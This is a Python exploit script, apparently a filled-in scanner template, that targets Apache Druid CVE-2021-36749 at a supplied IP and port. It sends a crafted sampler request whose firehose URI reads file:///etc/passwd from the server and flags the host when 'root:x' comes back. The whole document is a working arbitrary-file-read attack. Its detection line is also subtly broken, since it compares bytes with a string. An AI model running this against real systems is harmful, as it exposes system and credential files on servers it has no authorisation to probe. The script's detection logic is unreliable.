#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/druid/indexer/v1/sampler?for=connect"                                   #填写payload
    header = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8"
    }                                                               #填写header头
    data = "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\",\"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}"                                               #填写data数据
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3)

        if req.status_code == 200:
            if (b'root:x' in req.text) :              #填写判断条件
                logging.info("[+] {} find Apache_Druid_Abritrary_File_Read_CVE_2021_36749".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found Apache_Druid_Abritrary_File_Read_CVE_2021_36749".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)